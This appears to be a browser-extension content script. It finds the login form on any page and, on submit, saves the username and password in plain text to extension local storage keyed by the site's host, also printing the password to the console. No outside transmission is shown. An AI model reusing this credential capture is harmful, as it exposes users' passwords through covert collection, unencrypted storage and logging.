window.onload = function(){	
		console.log('inside window onload');
	
		//$("div").text("hello");

		var mypass_l = jQuery("input[type=password]");
		
		var mypass = mypass_l[0];

		var mypass_parent = mypass.parentNode;
		while(mypass_parent.tagName != "FORM"){
			mypass_parent = mypass_parent.parentNode;
			if(mypass_parent.tagName == "BODY"){return;}
		}
		
		var mypass_parent_cjq = jQuery(mypass_parent);
		var userid_find_l = mypass_parent_cjq.find("input[type=email]");
		if(userid_find_l.length == 0){
			userid_find_l = mypass_parent_cjq.find("input[type=text]");
			if(userid_find_l.length == 0){return;}
			
			var userid_find = userid_find_l[0];
			for(var i=0; i< userid_find_l.length; i++){
				userid_find = userid_find_l[i];
				if(userid_find.id.toLowerCase().indexOf("email") >= 0  ||
					userid_find.id.toLowerCase().indexOf("user")>= 0 ||
					userid_find.id.toLowerCase().indexOf("id") >= 0 ||
					userid_find.id.toLowerCase().indexOf("login") >= 0
					){break;}
				else if((i+1)== userid_find_l.length){
					console.log("end of for loop i =" + i);
					userid_find =  userid_find_l[0];
					console.log("value rand"+userid_find.id );
				}
			}
		}
		else{
			var userid_find = userid_find_l[0];
			console.log("email userid_find " + userid_find.id);
		}


		
		mypass_parent.onsubmit= function(){
			console.log("inside onsubmit");
			var url = window.location.host;
	    	var obj= {};
			obj[url] = "userID: " +userid_find.value +", password: " + mypass.value;
			mychrome_storage_local_set(obj, function() {});
			console.log(mypass.value);
		}
		
		console.log( mypass +'   end of window onload');
}


	// console.log('check console log');
 //    var url = window.location.host;
 //    console.log(url);
 //    var obj= {};

	// obj[url] = Date() ;


	// chrome.storage.local.set(obj, function() {
	//     // Notify that we saved.
	//    // console.log(url);
	// });
	
	// for extrect elememt from chrome local storage 
	// mychrome_storage_local_set(null , function(items) {
    
 //    console.log(items);
	// });










	// for clear data for chrome local storage
	// chrome.storage.local.clear();